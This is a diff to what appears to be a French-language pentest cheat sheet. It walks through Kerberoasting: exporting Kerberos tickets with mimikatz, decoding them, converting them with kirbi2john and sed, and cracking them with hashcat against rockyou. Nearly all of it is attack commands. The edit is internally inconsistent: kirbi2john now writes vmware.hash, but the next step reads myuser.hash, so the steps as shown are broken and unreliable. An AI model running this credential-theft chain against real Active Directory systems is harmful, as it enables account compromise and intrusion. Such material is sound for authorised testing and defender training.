@@ -56,8 +56,8 @@ mimikatz # kerberos::list /export
 # conversion depuis base64
 echo "<base64 blob>" |  tr -d \\n | base64 -d > myUser.kirbi
 # Extraction du hash pour l'utiliser avec john / hashcat
-kirbi2john.py myUser.kirbi  # génère un fichier crack_file
-sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > myUser_tgs_hashcat
+kirbi2john.py myUser.kirbi > vmware.hash
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' myuser.hash > myUser_tgs_hashcat
 # Cassage avec hashcat
 hashcat -m 13100 myUser_tgs_hashcat /usr/share/wordlists/rockyou.txt 
 ```
